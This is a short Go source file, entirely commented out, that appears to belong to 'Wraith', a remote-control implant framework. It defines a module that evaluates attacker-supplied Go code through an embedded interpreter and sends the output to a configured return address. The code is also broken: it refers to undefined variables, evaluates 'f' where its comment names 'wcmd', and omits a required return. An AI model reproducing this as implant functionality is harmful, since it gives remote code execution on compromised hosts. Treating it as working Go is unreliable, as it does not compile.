package stdmod

/*
import (
	"context"
	"fmt"

	"git.0x1a8510f2.space/0x1a8510f2/wraith/wraith/libwraith"

	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
)

type ExecGoModule struct{}

func (m *ExecGoModule) Mainloop(ctx context.Context, w *libwraith.Wraith) error {
	// Store results of command
	var result string

	defer func() {
		// Always catch panics from here as no error should crash Wraith
		if r := recover(); r != nil {
			result = fmt.Sprintf("command execution panicked with message: %s", r)
		}

		// Send off results if address and encoding is set
		if addrIface, exists := hkvs.Get("return.addr"); exists {
			if addr, ok := addrIface.(string); ok {
				if encodeIface, exists := hkvs.Get("return.encode"); exists {
					if encode, ok := encodeIface.(string); ok {
						m.w.PushTx(libwraith.TxQueueElement{
							Addr:     addr,
							Encoding: encode,
							Data: map[string]interface{}{
								"cmd.result": result,
							},
						})
					}
				}
			}
		}
	}()

	// Initialise yaegi to handle commands
	i := interp.New(interp.Options{})
	i.Use(stdlib.Symbols)
	// The code should generate a function called "wcmd" to be executed by Wraith.
	// That function should in turn return a string to be used as the result.
	// If the value of the key cmd is not a string, the panic will be caught and
	// returned as the command result.
	_, err := i.Eval(data.(string))
	if err != nil {
		panic(err)
	}
	fnv, err := i.Eval("f")
	if err != nil {
		panic(err)
	}
	fn, ok := fnv.Interface().(func() string)
	if !ok {
		panic("f is not a `func() string`")
	}
	result = fn()
}

func (m *ExecGoModule) WraithModuleName() string {
	return "w.execgo"
}
*/
